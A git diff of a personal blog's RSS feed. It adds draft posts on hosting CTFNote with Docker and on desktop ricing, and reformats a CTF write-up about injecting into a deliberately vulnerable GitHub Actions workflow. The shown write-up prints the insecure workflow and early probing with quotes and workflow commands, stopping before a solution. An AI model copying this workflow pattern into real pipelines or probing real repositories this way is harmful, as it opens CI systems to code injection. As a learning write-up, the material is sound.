@@ -1,42 +1,123 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[ISnackable's Blog]]></title><description><![CDATA[A blog site created with GatsbyJS.]]></description><link>https://isnackable.me</link><generator>RSS for Node</generator><lastBuildDate>Sat, 17 Jul 2021 09:58:31 GMT</lastBuildDate><item><title><![CDATA[A call to hacktion, a GitHub workflow CTF]]></title><description><![CDATA[Introduction “A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an…]]></description><link>https://isnackable.me/A-call-to-hacktion-a-github-workflow-ctf/</link><guid isPermaLink="false">https://isnackable.me/A-call-to-hacktion-a-github-workflow-ctf/</guid><content:encoded>&lt;h2&gt;Introduction&lt;/h2&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[ISnackable's Blog]]></title><description><![CDATA[A blog site created with GatsbyJS.]]></description><link>https://isnackable.me</link><generator>RSS for Node</generator><lastBuildDate>Mon, 19 Jul 2021 13:51:58 GMT</lastBuildDate><item><title><![CDATA[Collaborating with CTFNote]]></title><description><![CDATA[NOT DONE Introduction Collaborating on a CTF competition isn’t really easy, especially if your team is operating remotely in a different…]]></description><link>https://isnackable.me/ctfnote/</link><guid isPermaLink="false">https://isnackable.me/ctfnote/</guid><content:encoded>&lt;h1&gt;NOT DONE&lt;/h1&gt;
+&lt;img src=&quot;https://github.com/TFNS/CTFNote/raw/main/screenshots/main-dark.png&quot; width=&quot;100%&quot; alt=&quot;CTFNote Home Page&quot;&gt;
+&lt;h2&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Collaborating on a CTF competition isn’t really easy, especially if your team is operating remotely in a different timezone. Managing files and assignmnet of challenges get hetic. &lt;/p&gt;
+&lt;p&gt;My team and I used to collab on Discord, and we realised that when we wanted to see the challenges we solved, we realised that we didn’t post information on how to solve it. Thus, losing the steps on how to solve the challenge.&lt;/p&gt;
+&lt;p&gt;Looking for a solution, I came across, &lt;a href=&quot;https://github.com/TFNS/CTFNote&quot;&gt;CTFNote&lt;/a&gt;, a collaborative tool aiming to help CTF teams to organise their work. This tool was
+developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network Society&lt;/a&gt;.&lt;/p&gt;
+&lt;h2&gt;Hosting it&lt;/h2&gt;
+&lt;p&gt;I decided to host the application on &lt;a href=&quot;https://www.heroku.com/&quot;&gt;https://www.heroku.com/&lt;/a&gt;. &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Heroku is a cloud platform as a service supporting several programming languages. One of the first cloud platforms, Heroku has been in development since June 2007, when it supported only the Ruby programming language, but now supports Java, Node.js, Scala, Clojure, Python, PHP, and Go. - Wikipedia&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;My reason for picking Heroku is because it is &lt;strong&gt;free&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;Setting up CTF Note&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
+      &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# docker-compose.yml&lt;/span&gt;
+&lt;span class=&quot;token key atrule&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;3.7&quot;&lt;/span&gt;
+&lt;span class=&quot;token key atrule&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./api&quot;&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
+    &lt;span class=&quot;token key atrule&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;CREATE_PAD_URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;http://hedgedoc:3000/new&quot;&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;SHOW_PAD_URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/&quot;&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;DATABASE_URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;postgres://ctfnote:ctfnote@db:5432/ctfnote&quot;&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; db
+  &lt;span class=&quot;token key atrule&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./db&quot;&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; always
+    &lt;span class=&quot;token key atrule&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;POSTGRES_PASSWORD&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; ctfnote
+      &lt;span class=&quot;token key atrule&quot;&gt;POSTGRES_USER&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; ctfnote
+      &lt;span class=&quot;token key atrule&quot;&gt;POSTGRES_MULTIPLE_DATABASES&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; hedgedoc
+    &lt;span class=&quot;token key atrule&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;db&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;/var/lib/postgresql/data
+    &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
+  &lt;span class=&quot;token key atrule&quot;&gt;front&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
+    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./front&quot;&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; hedgedoc
+    &lt;span class=&quot;token key atrule&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token datetime number&quot;&gt;80:80&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;hedgedoc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; quay.io/hedgedoc/hedgedoc&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;1.7.2&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;debian
+    &lt;span class=&quot;token key atrule&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; CMD_DB_URL=postgres&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;//ctfnote&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;ctfnote@db&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;5432/hedgedoc
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; CMD_URL_PATH=pad
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; CMD_IMAGE_UPLOAD_TYPE=filesystem
+    &lt;span class=&quot;token key atrule&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; db
+    &lt;span class=&quot;token key atrule&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; always
+    &lt;span class=&quot;token key atrule&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; pad&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;uploads&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;/home/hackmd/app/public/uploads
+    &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
+&lt;span class=&quot;token key atrule&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;ctfnote-db&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;pad-uploads&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  ctfnote&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;h2&gt;Using it&lt;/h2&gt;
+&lt;img src=&quot;https://github.com/TFNS/CTFNote/raw/graphql/screenshots/tasks.png&quot; width=&quot;100%&quot; alt=&quot;CTFNote Tasks Page&quot;&gt;
+&lt;img src=&quot;https://github.com/TFNS/CTFNote/blob/main/screenshots/task.png?raw=true&quot; width=&quot;100%&quot; alt=&quot;CTFNote Task Page&quot;&gt;
+&lt;h2&gt;Acknowledgement&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/TFNS/CTFNote/tree/main&quot;&gt;https://github.com/TFNS/CTFNote/tree/main&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Ricing my setup]]></title><description><![CDATA[NOT DONE Introduction The term “rice” is used to describe a person’s unix desktop where “ricing” is when someone is custom their desktop…]]></description><link>https://isnackable.me/dotfiles/</link><guid isPermaLink="false">https://isnackable.me/dotfiles/</guid><content:encoded>&lt;h1&gt;NOT DONE&lt;/h1&gt;
+&lt;h2&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;The term “rice” is used to describe a person’s unix desktop where “ricing” is when someone is custom their desktop such as the icons, panels, or system interface. When it comes to ricing a tiling window manager though, the ricing of a user’s system becomes much more involved. Basic things such as the panel bar and application launcher must be configured by the user.&lt;/p&gt;
+&lt;p&gt;The reddit community &lt;a href=&quot;https://www.reddit.com/r/unixporn&quot;&gt;/r/unixporn&lt;/a&gt; is a great place to stay up to date on what people are using for their setups.&lt;/p&gt;
+&lt;h2&gt;Attribution&lt;/h2&gt;
+&lt;p&gt;Awesome project, Public domain, via Wikimedia Commons (&lt;a href=&quot;https://commons.wikimedia.org/wiki/File:Awesome_logo.svg&quot;&gt;https://commons.wikimedia.org/wiki/File:Awesome_logo.svg&lt;/a&gt;)&lt;/p&gt;</content:encoded></item><item><title><![CDATA[A call to hacktion, a GitHub workflow CTF]]></title><description><![CDATA[Introduction “A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an…]]></description><link>https://isnackable.me/A-call-to-hacktion-a-github-workflow-ctf/</link><guid isPermaLink="false">https://isnackable.me/A-call-to-hacktion-a-github-workflow-ctf/</guid><content:encoded>&lt;h2&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;“A call to hacktion, a GitHub workflow CTF” is a single level challenge based around GitHub Workflow best practices and an interesting vulnerability pattern that GitHub Security teams have seen out in the real world.&lt;/p&gt;
 &lt;p&gt;To solve the game, you will have to elevate your privileges from read-only to full write access on a designated game repository!&lt;/p&gt;
 &lt;h2&gt;My Process&lt;/h2&gt;
 &lt;p&gt;Okay, so we know that this challenge resolves around the GitHub Workflow, the vulnerability is probably in the workflow file.&lt;/p&gt;
 &lt;h4&gt;Content of &lt;strong&gt;comment-logger.yml&lt;/strong&gt;:&lt;/h4&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;
-      &lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;name: log and process issue comments
-on:
-  issue_comment:
-    types: [created]
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
+      &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; log and process issue comments
+&lt;span class=&quot;token key atrule&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;issue_comment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;created&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
 
-jobs:
-  issue_comment:
-    name: log issue comment
-    runs-on: ubuntu-latest
-    steps:
-      - id: comment_log
-        name: log issue comment
-        uses: actions/github-script@v3
-        env:
-          COMMENT_BODY: ${{ github.event.comment.body }}
-          COMMENT_ID: ${{ github.event.comment.id }}
-        with:
-          github-token: &amp;quot;deadc0de&amp;quot;
-          script: |
+&lt;span class=&quot;token key atrule&quot;&gt;jobs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;token key atrule&quot;&gt;issue_comment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; log issue comment
+    &lt;span class=&quot;token key atrule&quot;&gt;runs-on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; ubuntu&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;latest
+    &lt;span class=&quot;token key atrule&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; comment_log
+        &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; log issue comment
+        &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/github&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;script@v3
+        &lt;span class=&quot;token key atrule&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;COMMENT_BODY&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; github.event.comment.body &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;COMMENT_ID&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; github.event.comment.id &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;token key atrule&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;github-token&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;deadc0de&quot;&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token scalar string&quot;&gt;
             console.log(process.env.COMMENT_BODY)
-            return process.env.COMMENT_ID
-          result-encoding: string
-      - id: comment_process
-        name: process comment
-        uses: actions/github-script@v3
-        timeout-minutes: 1
-        if: ${{ steps.comment_log.outputs.COMMENT_ID }}
-        with:
-          script: |
+            return process.env.COMMENT_ID&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;result-encoding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; string
+      &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; comment_process
+        &lt;span class=&quot;token key atrule&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; process comment
+        &lt;span class=&quot;token key atrule&quot;&gt;uses&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; actions/github&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;script@v3
+        &lt;span class=&quot;token key atrule&quot;&gt;timeout-minutes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;token key atrule&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; steps.comment_log.outputs.COMMENT_ID &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;token key atrule&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token scalar string&quot;&gt;
             const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
-            return &amp;quot;&amp;quot;
-          result-encoding: string&lt;/code&gt;&lt;/pre&gt;
+            return &quot;&quot;&lt;/span&gt;
+          &lt;span class=&quot;token key atrule&quot;&gt;result-encoding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; string&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
 &lt;p&gt;As it was my first time working with GitHub workflow, I needed to understand how GitHub workflow works. I googled the workflow syntax for github actions to understand the workflow configuration. &lt;/p&gt;
 &lt;p&gt;Link: &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions&quot;&gt;https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions&lt;/a&gt;&lt;/p&gt;
@@ -116,32 +197,32 @@ jobs:
     &lt;/p&gt;
 &lt;p&gt;So I realised that my comment is a user input that I can control, which may or may not be the vulnerability. As this is my only lead, I went ahead and googled more GitHub actions workflow releated stuff, and I came across a GitHub Security Lab blog post about untrusted input.&lt;/p&gt;
 &lt;p&gt;Link: &lt;a href=&quot;https://securitylab.github.com/research/github-actions-untrusted-input&quot;&gt;https://securitylab.github.com/research/github-actions-untrusted-input&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yml&quot;&gt;
-      &lt;pre class=&quot;language-yml&quot;&gt;&lt;code class=&quot;language-yml&quot;&gt;- id: comment_log
-env:
-    COMMENT_BODY: ${{ github.event.comment.body }} // I CAN CONTROL
-    COMMENT_ID: ${{ github.event.comment.id }}
-    script: |
-    console.log(process.env.COMMENT_BODY) // MY INPUT, CAN I INJECT CODE HERE?
-    return process.env.COMMENT_ID
-    result-encoding: string
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
+      &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; comment_log
+&lt;span class=&quot;token key atrule&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;    &lt;span class=&quot;token key atrule&quot;&gt;COMMENT_BODY&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; github.event.comment.body &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; // I CAN CONTROL
+&lt;/span&gt;    &lt;span class=&quot;token key atrule&quot;&gt;COMMENT_ID&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; github.event.comment.id &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token scalar string&quot;&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;    console.log(process.env.COMMENT_BODY) // MY INPUT, CAN I INJECT CODE HERE?
+&lt;/span&gt;    return process.env.COMMENT_ID
+    result-encoding: string&lt;/span&gt;
 
-- id: comment_process
-if: ${{ steps.comment_log.outputs.COMMENT_ID }}
-with:
-    script: |
-    const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
-    return &amp;quot;&amp;quot;
-    result-encoding: string&lt;/code&gt;&lt;/pre&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token key atrule&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; comment_process
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;&lt;span class=&quot;token key atrule&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; $&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; steps.comment_log.outputs.COMMENT_ID &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;token key atrule&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token key atrule&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token scalar string&quot;&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;    const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
+&lt;/span&gt;    return &quot;&quot;
+    result-encoding: string&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
-&lt;p&gt;Looking at the workflow file again, I see that my input (&lt;em&gt;comment_body&lt;/em&gt;), is flows to &lt;code class=&quot;language-text&quot;&gt;console.log(process.env.COMMENT_BODY)&lt;/code&gt;. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, &lt;code class=&quot;language-text&quot;&gt;&amp;#39;&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;&amp;quot;&lt;/code&gt; to see if there is any error generated. &lt;/p&gt;
+&lt;p&gt;Looking at the workflow file again, I see that my input (&lt;em&gt;comment_body&lt;/em&gt;), is flows to &lt;code class=&quot;language-text&quot;&gt;console.log(process.env.COMMENT_BODY)&lt;/code&gt;. My first initial thought is that I could potential inject javascript code here. To test my theory, I tried inputing quotes, &lt;code class=&quot;language-text&quot;&gt;&apos;&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;&quot;&lt;/code&gt; to see if there is any error generated. &lt;/p&gt;
 &lt;p&gt;And did it work? Of course that didn’t work, it would have been too easy if it did. Afterwards, I thought to try out some of the steps written in the GitHub Security Lab blog post about untrusted input. I tried template injection, but that didn’t work as there is no template here.&lt;/p&gt;
 &lt;p&gt;Sadly, I was stuck here for a long time, just spamming and hoping for an error to pop out. I decided to continue googling GitHub actions/workflow, to see if I could find anything of interest. &lt;/p&gt;
 &lt;p&gt;Which somehow, I did. I found out that there is something called “workflow command”, not sure what that is, I read the website and noticed that a workflow command was passed in a &lt;code class=&quot;language-text&quot;&gt;console.log&lt;/code&gt;. I tried doing the same thing just to see what will happen.&lt;/p&gt;
 &lt;p&gt;Link: &lt;a href=&quot;https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions&quot;&gt;https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;My input: &lt;code class=&quot;language-text&quot;&gt;::save-state name=processID::12345&lt;/code&gt;. This workflow command create environment variables named STATE&lt;em&gt;processID with the value of 12345. I thought that this command could modify the COMMAND&lt;/em&gt;ID, so I replace “processID” with “COMMAND&lt;em&gt;ID”. Spoiler alert, it didn’t. Why not? That’s because this command created an enviroment variable and prepend “STATE&lt;/em&gt;“.&lt;/p&gt;
